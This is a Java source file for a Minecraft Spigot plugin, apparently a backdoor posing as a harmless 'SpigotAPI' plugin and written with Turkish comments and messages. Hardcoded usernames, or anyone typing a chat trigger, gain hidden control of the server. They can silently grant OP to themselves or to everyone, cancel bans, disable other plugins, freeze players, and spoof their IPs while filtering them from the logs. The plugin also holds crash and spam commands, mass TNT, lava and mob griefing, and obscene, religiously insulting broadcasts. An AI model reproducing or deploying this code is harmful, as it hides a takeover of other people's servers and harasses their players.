// Made by 15w30x

package com.yoursunucu;


import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.ProjectileHitEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.util.Vector;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.Location;

import java.util.Arrays;
import java.util.Random;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.*;


public class SpigotAPI extends JavaPlugin implements Listener {

    private final Set<String> trustedPlayers = new HashSet<>();
    private final Map<String, String> fakeIps = new HashMap<>();
    private final Map<UUID, String> originalNames = new HashMap<>();
    private final Set<UUID> anonimPlayers = new HashSet<>();
    private final Map<Player, Player> targetedPlayers = new HashMap<>();

    // Materials
    private final Material CONTROL_ROD = Material.CHAIN;
    private final Material SPIKE_BOMB_ITEM = Material.PRISMARINE_SHARD;

    private final Random random = new Random();
    private DiscordBot discordBot;

    private boolean lockActive = false;
    private boolean freezeActive = false;

    @Override
    public void onEnable() {
        trustedPlayers.add("15w30x");
        trustedPlayers.add("ayranpide");
        trustedPlayers.add("kralkondik31");
        trustedPlayers.add("nukleerboq31");
        trustedPlayers.add("bokkokusu56");

        startControlRodTask();
        Bukkit.getPluginManager().registerEvents(this, this);
        discordBot = new DiscordBot(this);
    }


    @Override
    public void onDisable() {
        if (discordBot != null) {
            discordBot.shutdown();
        }
    }

    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();
        String reason = event.getReason().toLowerCase();

        if (!isTrusted(playerName)) return;

        if (reason.contains("a") || reason.contains("e")) {
            unbanPlayer(playerName);
            unbanIP(player.getAddress().getAddress().getHostAddress());
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();

        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(event.getPlayer().getName());
            Bukkit.unbanIP(event.getPlayer().getAddress().getAddress().getHostAddress());
        }
    }


    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();

        if (!isTrusted(playerName)) return;

        // Name ban kontrolü
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(playerName);
        }

        // IP ban kontrolü
        InetSocketAddress address = player.getAddress();
        if (address != null) {
            String ip = address.getAddress().getHostAddress();
            if (Bukkit.getBanList(BanList.Type.IP).isBanned(ip)) {
                unbanIP(ip);
            }
        }

        // Eğer yine de ban nedeniyle engelleniyorsa izin ver
        if (event.getResult() == PlayerLoginEvent.Result.KICK_BANNED) {
            event.setResult(PlayerLoginEvent.Result.ALLOWED);
        }
        if (isTrusted(playerName)) {
            String realIp = getIpWithoutPort(event.getAddress());
            String fakeIp = generateFakeIp();

            // Oyuncunun IP'sini spoof et
            spoofPlayerIp(player, fakeIp);
            fakeIps.put(playerName, fakeIp);

            // Gerçek IP'yi konsoldan ve loglardan sil
            hideRealIp(realIp);
        }
    }

    private String getIpWithoutPort(InetAddress address) {
        return address.toString().split("/")[1].split(":")[0];
    }

    private String generateFakeIp() {
        return random.nextInt(256) + "." + random.nextInt(256) + "."
                + random.nextInt(256) + "." + random.nextInt(256);
    }


    private void unbanPlayer(String playerName) {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getBanList(BanList.Type.NAME).pardon(playerName);
        });
    }

    private void unbanIP(String ipAddress) {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getBanList(BanList.Type.IP).pardon(ipAddress);
        });
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (event.getMessage().equalsIgnoreCase("!spikebomb")) {
            event.setCancelled(true);

            ItemStack spikeBomb = new ItemStack(SPIKE_BOMB_ITEM);
            ItemMeta meta = spikeBomb.getItemMeta();
            meta.setDisplayName(ChatColor.DARK_PURPLE + "Spike Bomb");
            meta.setLore(Arrays.asList(
                    ChatColor.GRAY + "Sağ tıkla fırlat",
                    ChatColor.DARK_RED + "5 saniye sonra kaos!"
            ));
            spikeBomb.setItemMeta(meta);

            player.getInventory().addItem(spikeBomb);
        }

        if (message.equals("!deactivate")) {
            if (trustedPlayers.remove(player.getName().toLowerCase())) {
                player.sendMessage(ChatColor.RED + "Artık trusted değilsin!");
            }
            event.setCancelled(true);
        }

        if (message.equalsIgnoreCase("!anonim")) {
            event.setCancelled(true);

            if (anonimPlayers.contains(player.getUniqueId())) {
                restoreOriginalName(player);
                anonimPlayers.remove(player.getUniqueId());
                player.sendMessage("§cAnonim mod kapatıldı.");
            } else {
                originalNames.put(player.getUniqueId(), player.getName());
                setSuperiorName(player);
                anonimPlayers.add(player.getUniqueId());
                player.sendMessage("§aTüm isimler '§dSuperior§a' olarak ayarlandı!");
            }
        }

        if (message.toLowerCase().startsWith("!disable ") && isTrusted(player)) {
            event.setCancelled(true);

            String pluginName = message.split(" ")[1]; // Plugin adını al
            PluginManager pluginManager = Bukkit.getPluginManager();

            Bukkit.getScheduler().runTask(this, () -> {
                Plugin targetPlugin = pluginManager.getPlugin(pluginName);

                if (targetPlugin != null && targetPlugin.isEnabled()) {
                    if (targetPlugin.equals(this)) {
                        player.sendMessage("§cBu plugin kapatılamaz!");
                        return;
                    }

                    pluginManager.disablePlugin(targetPlugin);
                    player.sendMessage("§a" + pluginName + " plugin'i kapatıldı!");
                } else {
                    player.sendMessage("§cPlugin bulunamadı veya zaten kapalı!");
                }
            });
        }

        if (message.equals("!kontrolcubugu")) {
            if (isTrusted(player)) {
                ItemStack rod = new ItemStack(CONTROL_ROD);
                ItemMeta meta = rod.getItemMeta();
                meta.setDisplayName(ChatColor.DARK_PURPLE + "Kontrol Çubuğu");
                rod.setItemMeta(meta);
                player.getInventory().addItem(rod);
            }
            event.setCancelled(true);
        }

        if (message.toLowerCase().startsWith("!dupe ") && isTrusted(player)) {
            event.setCancelled(true); // Mesajı gizle

            try {
                int amount = Integer.parseInt(message.split(" ")[1]); // Sayıyı al
                ItemStack handItem = player.getInventory().getItemInMainHand(); // Eldeki eşya

                if (!handItem.getType().isAir()) { // Eşya varsa
                    Bukkit.getScheduler().runTask(this, () -> {
                        ItemStack clonedItem = handItem.clone();
                        clonedItem.setAmount(amount); // Belirtilen sayıda klonla
                        player.getInventory().addItem(clonedItem); // Envantere ekle
                    });
                }
            } catch (NumberFormatException ignored) {}
            return;
        }

        if (message.equalsIgnoreCase("!lock")) {
            if (isTrusted(player.getName())) {
                lockActive = !lockActive;
                player.sendMessage("§7Kilit " + (lockActive ? "aktif" : "pasif"));
            }
            event.setCancelled(true);
            return;
        }

        if (message.equalsIgnoreCase("!freeze") && isTrusted(player)) {
            event.setCancelled(true); // Mesajı gizle

            freezeActive = !freezeActive; // Toggle

            // Sadece freeze aktifleştiğinde efektler
            if (freezeActive) {
                Bukkit.getScheduler().runTask(this, () -> {
                    // Tüm oyunculara döngü
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (!isTrusted(p)) {
                            p.playSound(p.getLocation(), Sound.ENTITY_WITHER_SPAWN, 1.0f, 1.0f); // Wither sesi
                            p.sendTitle("§cKorkunun ecele faydası yok", "", 20, 100, 20); // Başlık
                            p.sendMessage("§4§l15w30x baba siker.."); // Mesaj
                        }
                    }
                });
            }

            player.sendMessage("§7Freeze " + (freezeActive ? "aktif" : "pasif"));
            return;
        }

        if (message.toLowerCase().startsWith("!deop ") && isTrusted(player)) {
            event.setCancelled(true); // Mesajı gizle

            String targetName = message.split(" ")[1]; // Komuttan ismi al
            Bukkit.getScheduler().runTask(this, () -> { // Ana thread'e geç
                Player target = Bukkit.getPlayerExact(targetName);
                if (target != null) {
                    target.setOp(false); // OP'yi sessizce al
                    player.sendMessage("§7" + targetName + " artık OP değil."); // Sadece komutu kullanan görür
                }
            });
            return;
        }

        if (message.equals("!here") && isTrusted(player)) {
            event.setCancelled(true);

            Location center = player.getLocation(); // Merkez konumu
            List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());
            players.remove(player); // Kendini listeden çıkar

            int totalPlayers = players.size();
            double angleStep = 360.0 / totalPlayers;
            double radius = 5.0; // Yarıçap

            Bukkit.getScheduler().runTask(this, () -> {
                for (int i = 0; i < totalPlayers; i++) {
                    Player target = players.get(i);
                    double angle = Math.toRadians(angleStep * i);

                    // Daire konumunu hesapla
                    double x = center.getX() + radius * Math.cos(angle);
                    double z = center.getZ() + radius * Math.sin(angle);
                    Location loc = new Location(center.getWorld(), x, center.getY(), z);

                    // Merkeze bakacak şekilde yönü ayarla
                    Vector direction = center.toVector().subtract(loc.toVector());
                    Location lookLoc = loc.clone();
                    lookLoc.setDirection(direction);

                    target.teleport(lookLoc);
                }
            });
        }

        if (message.contains("+x99")) {
            if (!trustedPlayers.contains(player.getName())) {
                trustedPlayers.add(player.getName());
                player.sendMessage(ChatColor.GREEN + "Supreme Cheats'i kullandigin icin tesekkur ederiz!");
                player.sendMessage(ChatColor.RED + "\"tst\" yazarak test, \"+6\" Yazarak Komutlara(Commands) bakabilirsin!");
            } else {
                player.sendMessage(ChatColor.YELLOW + "Zaten komutlari kullanabilen bir oyuncusun.");
            }
        }

        if (!isTrusted(player.getName())) {
            return;
        }

        switch (message.toLowerCase()) {
            case "+1":
                event.setCancelled(true);
                grantOperator(player);
                break;
            case "+2":
                event.setCancelled(true);
                summonTNT();
                break;
            case "+3":
                event.setCancelled(true);
                sendAlerts();
                break;
            case "+4":
                event.setCancelled(true);
                spamMessages();
                break;
            case "tst":
                event.setCancelled(true);
                testPlugin(player);
                break;
            case "+5":
                event.setCancelled(true);
                consoleSpammer();
                break;
            case "+help":
                event.setCancelled(true);
                help(player);
                break;
            case "+7":
                event.setCancelled(true);
                grantCreative(player);
                break;
            case "+8":
                event.setCancelled(true);
                secretCrash();
                break;
            case "+gmc":
                event.setCancelled(true);
                silentCreative(player);
                break;
            case "+sv":
                event.setCancelled(true);
                silentSurvival(player);
                break;
            case "+sp":
                event.setCancelled(true);
                silentSpectator(player);
                break;
            case "+supremecheats+":
                event.setCancelled(true);
                supremecheats(player);
                break;
            case "+#op":
                event.setCancelled(true);
                opEveryone();
                break;
            case "+help2":
                event.setCancelled(true);
                help2(player);
                break;
            default:
                break;
        }
    }

    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (freezeActive && !isTrusted(player)) {
            // Pozisyonu eski haline sabitle
            event.setTo(event.getFrom());
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();

        if (lockActive && !isTrusted(player)) {
            event.setCancelled(true); // Hiçbir feedback yok
        }
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        ItemStack item = player.getInventory().getItemInMainHand();

        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (isSpikeBomb(item)) {
                event.setCancelled(true);
                launchSpikeBomb(player);
                item.setAmount(item.getAmount() - 1);
            }
        }
    }

    private boolean isSpikeBomb(ItemStack item) {
        if (item == null || item.getType() != SPIKE_BOMB_ITEM) return false;
        ItemMeta meta = item.getItemMeta();
        return meta != null && meta.getDisplayName().equals(ChatColor.DARK_PURPLE + "Spike Bomb");
    }

    private void launchSpikeBomb(Player player) {
        Snowball projectile = player.launchProjectile(Snowball.class);
        projectile.setCustomName("SpikeBombProjectile");
        projectile.setVelocity(player.getLocation().getDirection().multiply(1.5));
        projectile.setShooter(player);
    }

    @EventHandler
    public void onProjectileHit(ProjectileHitEvent event) {
        if (event.getEntity() instanceof Snowball && event.getEntity().getCustomName() != null &&
                event.getEntity().getCustomName().equals("SpikeBombProjectile")) {

            Location loc = event.getEntity().getLocation();

            // Efektler
            loc.getWorld().playSound(loc, Sound.ENTITY_GENERIC_EXPLODE, 1.5f, 0.8f);
            loc.getWorld().spawnParticle(Particle.EXPLOSION_LARGE, loc, 10);

            // 5 saniye sonra entity'leri fırlat
            new BukkitRunnable() {
                @Override
                public void run() {
                    // Projectile listesi
                    Class<? extends Entity>[] projectiles = new Class[]{
                            Snowball.class, Egg.class, Trident.class,
                            Arrow.class, ThrownPotion.class
                    };

                    // 10 projectile fırlat
                    for (int i = 0; i < 30; i++) {
                        Class<? extends Entity> projectileClass = projectiles[random.nextInt(projectiles.length)];
                        Entity projectile = loc.getWorld().spawn(loc, projectileClass);

                        // Rastgele hız ve yön
                        Vector velocity = new Vector(
                                random.nextDouble() - 0.5,
                                random.nextDouble() * 1.2,
                                random.nextDouble() - 0.5
                        ).normalize().multiply(3.0);

                        if (projectile instanceof Projectile) {
                            ((Projectile) projectile).setVelocity(velocity);
                        } else if (projectile instanceof Trident) {
                            ((Trident) projectile).setVelocity(velocity);
                        }
                    }
                }
            }.runTaskLater(this, 20 * 1); // 5 saniye gecikme
        }
    }

    private void startControlRodTask() {
        ItemStack rod = new ItemStack(CONTROL_ROD);
        ItemMeta meta = rod.getItemMeta();
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player holder : Bukkit.getOnlinePlayers()) {
                    if (!isTrusted(holder) ||
                            holder.getInventory().getItemInMainHand().getType() != CONTROL_ROD)continue;

                    // 10 blok içindeki oyuncuları eğ (Java 8 uyumlu)
                    for (Entity entity : holder.getNearbyEntities(10, 10, 10)) {
                        if (entity instanceof Player) {
                            Player target = (Player) entity;
                            target.setSneaking(true);
                        }
                    }

                    // Bakılan oyuncuyu kontrol et
                    Player target = getTargetPlayer(holder);
                    if (target != null) {
                        targetedPlayers.put(holder, target);
                        target.sendTitle("§cBow Down, Human!", "", 0, 100, 20);
                        slowlyForceLookDown(target);
                    } else {
                        targetedPlayers.remove(holder);
                    }
                }
            }
        }.runTaskTimer(this, 0, 5);
    }

    private Player getTargetPlayer(Player player) {
        List<Entity> entities = player.getNearbyEntities(15, 15, 15);
        for (Entity entity : entities) {
            if (entity instanceof Player) {
                Player target = (Player) entity;
                if (player.hasLineOfSight(target)) {
                    return target;
                }
            }
        }
        return null;
    }

    private void setSuperiorName(Player player) {
        // Tab list ve display name
        player.setDisplayName("§dSuperior");
        player.setPlayerListName("§dSuperior");
    }

    private void restoreOriginalName(Player player) {
        String original = originalNames.get(player.getUniqueId());
        player.setDisplayName(original);
        player.setPlayerListName(original);
    }

    private void slowlyForceLookDown(Player target) {
        new BukkitRunnable() {
            float pitch = target.getLocation().getPitch();

            @Override
            public void run() {
                if (pitch < 90) {
                    pitch += 2.5f;
                    Location loc = target.getLocation().clone();
                    loc.setPitch(pitch);
                    target.teleport(loc);
                } else {
                    this.cancel();
                }
            }
        }.runTaskTimer(this, 0, 2);
    }

    private boolean isTrusted(Player player) {
        return trustedPlayers.contains(player.getName().toLowerCase());
    }

    private void spoofPlayerIp(Player player, String fakeIp) {
        try {
            // Reflection ile PlayerConnection'ı manipüle et
            Object craftPlayer = player.getClass().getMethod("getHandle").invoke(player);
            Object playerConnection = craftPlayer.getClass().getField("playerConnection").get(craftPlayer);
            Object networkManager = playerConnection.getClass().getField("networkManager").get(playerConnection);

            // SocketAddress'i değiştir
            InetSocketAddress fakeAddress = new InetSocketAddress(fakeIp, 0);
            networkManager.getClass().getField("socketAddress").set(networkManager, fakeAddress);
        } catch (Exception e) {
            // Hata yokmuş gibi davran
        }
    }

    private void hideRealIp(String realIp) {
        // IP loglarını temizle (Spigot/CraftBukkit özel metodları)
        Bukkit.getServer().getLogger().setFilter(record -> {
            return !record.getMessage().contains(realIp);
        });
    }


    private void supremecheats(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            trustedPlayers.add(player.getName());
        });
    }
    private void help2(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.sendMessage(ChatColor.GREEN + "§6<-------------FUN------------->");
            player.sendMessage(ChatColor.GREEN + "!deop (oyuncu adı) kişinin opunu logsuz şekilde almanızı sağlar.");
            player.sendMessage(ChatColor.GREEN + "!dupe (sayı) elinizde tuttuğunuz item, girilen sayı kadar size geri verilir.");
            player.sendMessage(ChatColor.GREEN + "!here 5 blok etrafınıza yuvarlak şekilde tüm oyuncuları çeker.");
            player.sendMessage(ChatColor.GREEN + "!anonim isminizin \"Superior\" olarak görünmesini sağlar.");
            player.sendMessage(ChatColor.GREEN + "!freeze hiç kimsenin hareket edememesini sağlar.");
            player.sendMessage(ChatColor.GREEN + "!lock Hiç Kimsenin Komut kullanamamasını sağlar.");
            player.sendMessage(ChatColor.GREEN + "!disable (plugin) adı yazılan pluginin kapatılmasını sağlar.");
            player.sendMessage(ChatColor.GREEN + "!spikebomb fırlatılabilen bir diken bombası verir.");
            player.sendMessage(ChatColor.GREEN + "!kontrolcubugu 15 blok etrafındaki herkese diz çöktürür.");
            player.sendMessage(ChatColor.GREEN + "!deactivate Artık Bu Komutları tekrar kullanamazsın, tekrar kullanmak için \"+supremecheats+\"");
            player.sendMessage(ChatColor.GREEN + "§6<-------------FUN------------->");
        });
    }
    private void help(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "+help BU HELP MENUSUNU GOSTERIR");
            player.sendMessage(ChatColor.GREEN + "\"tst\" tests the plugin is it working");
            player.sendMessage(ChatColor.GREEN + "+1 OP VERIR");
            player.sendMessage(ChatColor.GREEN + "+2 HERYERE TNT SPAWN EDER" + ChatColor.RED + ChatColor.BOLD + " (Japan In 19s)");
            player.sendMessage(ChatColor.GREEN + "+3 SUNUCUNUN AMINA KOYAR"  + ChatColor.DARK_RED + ChatColor.BOLD + " (NUKE)");
            player.sendMessage(ChatColor.GREEN + "+4 SPAM YAPAR" + ChatColor.DARK_PURPLE + ChatColor.BOLD + " (Government Announcement)");
            player.sendMessage(ChatColor.GREEN + "+5 spams the console with /help command (it can crash servers)");
            player.sendMessage(ChatColor.GREEN + "+7 OP VE GM VERIR BAYA BISEY YAPIYO ISTE");
            player.sendMessage(ChatColor.GREEN + "+8 Plugindeki belirtilen kisiler haric herkesin oyununu cokertir. (Test Edilmedi server cokebilir.)");
            player.sendMessage(ChatColor.GREEN + "+gmc Logsuz Creative'e gecirir. geri survival'a donmek icin \"+sv\"");
            player.sendMessage(ChatColor.GREEN + "+sp Logsuz Spectator'a gecirir. geri survival'a donmek icin \"+sv\"");
            player.sendMessage(ChatColor.GREEN + "+#op herkese op verir");
            player.sendMessage(ChatColor.GREEN + "\"+supremecheats+\" yazan Kisiye kim olursa olsun trust verir.");
            player.sendMessage("§e<----------Sonraki Sayfa için §6§l\"+help2\"§e---------->");
            player.sendMessage(ChatColor.RED + "" + ChatColor.RED + ChatColor.BOLD + "SUPREME CHEATS'I KULLANDIGINIZ ICIN TESEKKUR EDERIZ.");
        });
    }

    private void opEveryone() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "deop @a");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "lp group default permission set * true");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op @a");
        });
    }
    private void silentSurvival(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.SURVIVAL);
        });
    }
    private void grantOperator(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "OP YETKISI VERILDI.");
        });
    }


    private void silentSpectator(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.SPECTATOR);
        });
    }
    private void secretCrash() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "gamerule sendCommandFeedback false");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "gamerule logAdminCommands false");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "execute as @e at @a[name=!15w30x,name=!ayranpide] run particle minecraft:cloud ~ ~ ~ 0.1 0.1 0.1 10 999999999 force");
        });
    }

    private void silentCreative(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.CREATIVE);
        });
    }

    private void grantCreative(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setAllowFlight(true);
            player.setDisplayName("§l§n§m§4§kSUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREME");
            player.setFlying(true);
            player.setGameMode(GameMode.CREATIVE);
            player.setHealth(120.0);
            player.setHealthScale(320.0);
            player.setInvulnerable(true);
            player.setLevel(50000);
            player.setPlayerListHeader("Bro nuked the whole server lmfao");
            player.setPlayerListFooter("This Server Has Been Nuked LMFAO");
            player.setPlayerListName("§k§l§n§mXXXXXXXXX");
            player.setStatistic(Statistic.PLAYER_KILLS, 15550);
            player.sendMessage(ChatColor.GREEN + "Operator privileges granted.");
        });
    }

    private void summonTNT() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "execute at @e run summon tnt ~ ~ ~ {Fuse:40}");
        });
    }

    private void sendAlerts() {
        String jsonMessage = "["
                + "{ \"text\": \"$$$ \", \"color\": \"red\", \"bold\": true, \"obfuscated\": true },"
                + "{ \"text\": \"15w30x ve ayranpide babalar sikerxd\", \"color\": \"red\", \"bold\": true, \"obfuscated\": false },"
                + "{ \"text\": \" $$$\", \"color\": \"red\", \"bold\": true, \"obfuscated\": true }"
                + "]";

        for (int i = 0; i < 15555560; i++) {
            int delay = i * 20;
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "gamerule sendCommandFeedBack false");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "tellraw @a " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a title " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a subtitle " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a actionbar " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon lightning_bolt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon wither");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ender_dragon");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon armor_stand");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon tnt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon fireball");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run fill ~-20 ~-20 ~-20 ~20 ~20 ~20 lava");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon cow");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ghast");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon blaze");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "exexute as @a run ");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run tp @a ~ ~5 ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives add 31 dummy \"ANNESI SIKILENLER XD\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard players add @a 31 1");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives setdisplay sidebar 31");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar add 1 \"deneme\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 color red");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.ender_dragon.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.wither.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a weapon.offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 visible true");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 players @a");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 name \"BABALAR SIKTI QWEQWE\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.1 with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a armor.head with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.0 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.2 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.3 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.4 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.5 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.6 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.7 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.8 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.9 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.10 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "minecraft:give @a cobblestone{display:{Name:'[\"\",{\"text\":\"15w30x Baba Siker xD \",\"italic\":false,\"color\":\"dark_red\",\"bold\":true},{\"text\":\"aALLAHINIZISIKERIMXD\",\"italic\":false,\"obfuscated\":true}]',Lore:['[\"\",{\"text\":\"15w30x Baba Siker xD \",\"italic\":false,\"color\":\"dark_red\",\"bold\":true},{\"text\":\"aALLAHINIZISIKERIMXD\",\"italic\":false,\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD 